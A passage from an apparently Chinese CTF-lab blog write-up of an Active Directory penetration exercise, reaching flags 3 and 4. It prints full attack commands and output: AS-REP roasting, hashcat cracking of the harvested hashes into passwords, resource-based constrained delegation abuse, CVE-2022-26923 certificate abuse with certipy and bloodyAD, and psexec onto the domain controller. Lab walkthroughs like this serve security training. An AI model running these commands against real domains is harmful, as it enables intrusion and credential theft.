+<pre tabindex="0"><code>proxychains4 python psexec.py administrator@172.22.15.24 -hashes &#39;:0e52d03e9b939997401466a0ec5a9cbc&#39; -codec gbk
+</code></pre><p><img alt="image-20250327165008127" loading="lazy" src="../assets/image-20250327165008127-1748854959640-15.png"></p>
+<p>接着读flag</p>
+<h3 id="flag3-rdbc">FLAG3-RDBC<a hidden class="anchor" aria-hidden="true" href="#flag3-rdbc">#</a></h3>
+<p>接着看 172.22.15.24</p>
+<p>访问 /www/sys/index.php</p>
+<p><img alt="image-20250331124309633" loading="lazy" src="../assets/image-20250331124309633-1748854959640-9.png"></p>
+<p>默认密码admin/123456成功登入</p>
+<p><img alt="image-20250331124144053" loading="lazy" src="../assets/image-20250331124144053-1748854959640-10.png"></p>
+<p>这个oa系统没办法直接拿到shell</p>
+<p>但是我们可以进行一些信息收集</p>
+<p>在团队-&gt;同事页面可以收集到一堆邮箱</p>
+<p><img alt="image-20250331131208696" loading="lazy" src="../assets/image-20250331131208696-1748854959640-11.png"></p>
+<p>我们可以利用这堆邮箱来构造用户名字典</p>
+<pre tabindex="0"><code>lixiuying@xiaorang.lab
+lixiaoliang@xiaorang.lab
+zhangyi@xiaorang.lab
+jiaxiaoliang@xiaorang.lab
+zhangli@xiaorang.lab
+zhangwei@xiaorang.lab
+liuqiang@xiaorang.lab
+wangfang@xiaorang.lab
+wangwei@xiaorang.lab
+wanglihong@xiaorang.lab
+huachunmei@xiaorang.lab
+wanghao@xiaorang.lab
+zhangxinyu@xiaorang.lab
+huzhigang@xiaorang.lab
+lihongxia@xiaorang.lab
+wangyulan@xiaorang.lab
+chenjianhua@xiaorang.lab
+</code></pre><p>在后续进行爆破的时候可以使用</p>
+<p>这里我们猜测机子未开启预身份验证，尝试使用AS-REP Roasting攻击</p>
+<pre tabindex="0"><code>AS-REP Roasting是一种对用户账户进行离线爆破的攻击方式。但是该攻击方式使用上比较受限，因为其需要用户账户设置不要求Kerberos 预身份验证选项，而该选项默认是没有勾选的。Kerberos 预身份验证发生在 Kerberos 身份验证的第一阶段（AS_REQ&amp;AS REP），它的主要作用是防止密码离线爆破。默认情况下，预身份验证是开启的，KDC 会记录密码错误次数，防止在线爆破。
+当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的 Kerberos 88 端口请求票据，此时域控不会进行任何验证就将 TGT 和该用户 Hash 加密的 Login Session Key 返回。因此，攻击者就可以对获取到的用户 Hash 加密的 Login Session Key 进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码。
+————————————————
+                        
+原文链接：https://blog.csdn.net/weixin_45954730/article/details/140647751
+</code></pre><p>这里使用impacket-GetNPUsers工具，这个工具会尝试获得并列出不需要Kerberos域认证的用户</p>
+<pre tabindex="0"><code>proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/ 
+</code></pre><p>结果</p>
+<pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
+└─# proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] User lihongxia@xiaorang.lab doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] User wangyulan@xiaorang.lab doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] User chenjianhua@xiaorang.lab doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre><p>拿到了两个用户的TGT票据</p>
+<pre tabindex="0"><code>$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8
+
+$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac
+</code></pre><p>用hashcat和kali自带的字典 rockyou 爆破一下</p>
+<pre tabindex="0"><code>hashcat -m 18200 --force -a 0 &#39;$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:91e6b6e8eca3c81e9ebc041af6fbe6c9$b1de5c61b73c01359b467a40d0ddf8819234b3f383462eec85dc510eb1c3af9ce6718c33a510a131874bea7e2f2651d7d3de029cdb2c6b6e762bebda4756af475bd4c6c06db8ba3944b1608a5e9e7c2bb312db138301a28abc71b8d6cff4e4dfca8e31746d8b1856fc3e3234526bf2b183b79b6b21da685d3db4466505164f8e8e1a5290cabb7ba03c87406fa6eb4c24328f0e40af722bddffb95dff6fb23f1efeb23d0c491d1462c09e952c2783ca3f9ff8bc3b1b8c065df2e7e179801242b1e1643d639b4c2a56ca7fda7df124689b4af63b6ddc30a07299cac1a8b45fe23a3e0ec5078c16ae75880f9ae8&#39; ./rockyou.txt
+
+hashcat -m 18200 --force -a 0 &#39;$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:9159559ba318af794bad4ac369b60a1e$2dd93a8a64ff9e932b1707c3e2fbdd379ced93ffb975f5d7dd52b728e0f7dd0c0ea0cc7ffb924897a1a6c1bee062e1b2fb25431f45f4b44ad73a390269d5c5df8b74591b07db87cb22d0de7c5540996343304336da5b11c412b1613b8b2b59c774ce1c6cc99556b0c63484533be7790a058c994b3c9be8fdc780ff9ab5a1e0a0f2c560665dd221335baadb5eca7577290085079fe8cd9da81d7bcaae840133efad3de3698e4e43a617d0d8d9fcb981f9184f2ac639a65640774d409453ab4754d8107d89c12c1a41acf1b23c9bbcc8ec35743b746936a8d34ea3c031b274058826d48ee5ae7f954cb01770ac&#39; ./rockyou.txt
+</code></pre><p>得到明文密码</p>
+<p><img alt="image-20250331134720342" loading="lazy" src="../assets/image-20250331134720342-1748854959640-12.png"></p>
+<p><img alt="image-20250331134802825" loading="lazy" src="../assets/image-20250331134802825-1748854959640-13.png"></p>
+<pre tabindex="0"><code>lixiuying@xiaorang.lab/winniethepooh
+huachunmei@xiaorang.lab/1qaz2wsx
+</code></pre><p>尝试一下rdp连接172.22.15.13</p>
+<p><img alt="image-20250331135007024" loading="lazy" src="../assets/image-20250331135007024-1748854959640-17.png"></p>
+<p>发现没有权限</p>
+<p>那我们可以尝试拿这两个账户去连其他的机子</p>
+<p>成功登上 172.22.15.35</p>
+<p><img alt="image-20250331135150057" loading="lazy" src="../assets/image-20250331135150057-1748854959640-14.png"></p>
+<p>先用bloodhound信息收集一手</p>
+<pre tabindex="0"><code>proxychains4 bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp
+</code></pre><p><img alt="image-20250402010432493" loading="lazy" src="../assets/image-20250402010432493-1748854959640-16.png"></p>
+<p>可以看到<code>LIXIUYING@XIAORANG.LAB</code> 对 <code>XR-0687.XIAORANG.LAB</code> 有 GenericWrite 的权限</p>
+<p>可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限</p>
+<p>添加一个机器用户</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-addcomputer -computer-name &#39;xrntkk$&#39; -computer-pass &#39;Abc123456&#39; -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 &#34;xiaorang.lab/lixiuying:winniethepooh&#34;
+</code></pre><p><img alt="image-20250430171637739" loading="lazy" src="../assets/image-20250430171637739.png"></p>
+<p>配置RDBC</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -delegate-from &#34;xrntkk$&#34; -delegate-to &#34;XR-0687$&#34; -dc-ip 172.22.15.13
+</code></pre><p><img alt="image-20250430172409848" loading="lazy" src="../assets/image-20250430172409848.png"></p>
+<p>使用 impacket工具的getST执行基于资源的约束性委派工具并获取拥有访问XR-0687机器上的GIFS服务的高权限票据</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-getST xiaorang.lab/xrntkk$:&#39;Abc123456&#39; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13
+</code></pre><p>导入票据</p>
+<pre tabindex="0"><code>export KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache
+</code></pre><p>接下来psexec连主机就好了</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-psexec &#39;xiaorang.lab/administrator@XR-0687.xiaorang.lab&#39; -target-ip 172.22.15.35 -codec gbk -no-pass -k
+</code></pre><p><img alt="image-20250430173436078" loading="lazy" src="../assets/image-20250430173436078.png"></p>
+<p>flag3</p>
+<pre tabindex="0"><code>C:\Users\Administrator\flag&gt; type flag03.txt
+  __ _            __ ____
+ / _| |__ _ __ _ /  \__ /
+|  _| / _` / _` | () |_ \
+|_| |_\__,_\__, |\__/___/
+           |___/
+
+flag03: flag{40c21602-c68d-4667-892f-bbb24d452eb4}
+</code></pre><h3 id="flag4-cve-2022-26923">FLAG4-CVE-2022-26923<a hidden class="anchor" aria-hidden="true" href="#flag4-cve-2022-26923">#</a></h3>
+<p><img alt="image-20250430175027180" loading="lazy" src="../assets/image-20250430175027180.png"></p>
+<p>Certipy-ad:<a href="https://github.com/ly4k/Certipy/">ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse</a></p>
+<p>使用certipy-ad工具创建一个账户，并设置dNSHostName</p>
+<pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
+└─# proxychains4 certipy account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user xrntkk3 -pa
+ss Abc123456 -dns &#39;XR-DC01.xiaorang.lab&#39;
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:636  ...  OK
+[*] Creating new account:
+    sAMAccountName                      : xrntkk3$
+    unicodePwd                          : Abc123456
+    userAccountControl                  : 4096
+    servicePrincipalName                : HOST/xrntkk3
+                                          RestrictedKrbHost/xrntkk3
+    dnsHostName                         : XR-DC01.xiaorang.lab
+[*] Successfully created account &#39;xrntkk3$&#39; with password &#39;Abc123456&#39;
+</code></pre><p>用创建的账户向XR-CA请求证书</p>
+<pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
+└─# proxychains4 certipy req -u xrntkk3\$@xiaorang.lab -p Abc123456 -target 172.22.15.18 -ca &#34;xiaorang-XR-CA-CA&#34; -templa
+te Machine
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.18:445  ...  OK
+[*] Successfully requested certificate
+[*] Request ID is 9
+[*] Got certificate with DNS Host Name &#39;XR-DC01.xiaorang.lab&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;xr-dc01.pfx&#39;
+</code></pre><p>向 KDC 请求域控的 TGT</p>
+<pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
+└─# proxychains4 certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: xr-dc01$@xiaorang.lab
+[*] Trying to get TGT...
+[proxychains] Strict chain  ...  113.45.175.138:6666  ...  172.22.15.13:88  ...  OK
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+</code></pre><p>发现报错了，遇到 <strong>KDC_ERR_PADATA_TYPE_NOSUPP</strong> 错误，显示 KDC 不支持 PADATA 类型（预认证数据）, Kerberos 预身份验证失败</p>
+<p>需要尝试其他利用证书的方法</p>
+<p>这里可以使用bloodyAD利用证书去配置rdbc</p>
+<p><a href="https://github.com/CravateRouge/bloodyAD">CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework</a></p>
+<p>把证书文件转换为 <code>PEM</code> 格式</p>
+<pre tabindex="0"><code>certipy cert -pfx xr-dc01.pfx &gt; xr-dc01.pem
+</code></pre><p>配置rdbc</p>
+<pre tabindex="0"><code>┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]
+└─# proxychains4 -q bloodyAD -d xiaorang.lab -u &#39;xrntkk3$&#39; -c &#39;:xr-dc01.pem&#39; --host 172.22.15.13 --secure add rbcd &#39;xr-d
+c01$&#39; &#39;xrntkk3$&#39;
+[!] No security descriptor has been returned, a new one will be created
+[+] xrntkk3$ can now impersonate users on xr-dc01$ via S4U2Proxy
+</code></pre><p>接下来就可以申请票据了</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-getST &#39;xiaorang.lab/xrntkk3$:Abc123456&#39; -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13
+</code></pre><p>导入票据</p>
+<pre tabindex="0"><code>export KRB5CCNAME=Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache
+</code></pre><p>psexec连</p>
+<pre tabindex="0"><code>proxychains4 -q impacket-psexec &#39;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#39; -target-ip 172.22.15.13 -codec gbk -no-pass -k
+</code></pre><p>flag04</p>
+<pre tabindex="0"><code>c:\Users\Administrator\flag&gt; type flag04.txt
+
+ :::===== :::      :::====  :::=====  :::====  :::  ===
+ :::      :::      :::  === :::       :::  === :::  ===
+ ======   ===      ======== === ===== ===  === ========
+ ===      ===      ===  === ===   === ===  ===      ===
+ ===      ======== ===  ===  =======   ======       ===
+
+
+flag04: flag{bcc6c72d-ae14-41bb-9d05-1655c6d7e6b2}
+</code></pre><p>这个还有一些其他的打法，后面再补</p>
+<p>whoami师傅关于PKINIT 不起作用的证书利用方法的文章：</p>
+<p><a href="https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/">Pass The Certificate when PKINIT Padata Type is NOSUPP | WHOAMI</a></p>
+<p>后渗透部分基本上是跟着h0ny师傅的博客打的，太强了。</p>
+<p>参考文章</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/longlangci/article/details/131686439">2022网鼎杯半决赛复盘-CSDN博客</a></p>
+<p><a href="https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83">https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83</a></p></blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://blog.xrntkk.top/tags/writeup/">Writeup</a></li>
+      <li><a href="https://blog.xrntkk.top/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+      <li><a href="https://blog.xrntkk.top/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://blog.xrntkk.top/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>春秋云镜-长城杯2024-Writeup</span>
+  </a>
+  <a class="next" href="https://blog.xrntkk.top/post/tgctf_2025/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>TGCTF-2025-Web-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+    <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv">
+        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
+    </span>
+    <span id="busuanzi_container_site_uv">
+        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
+    </span>
+    </div></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
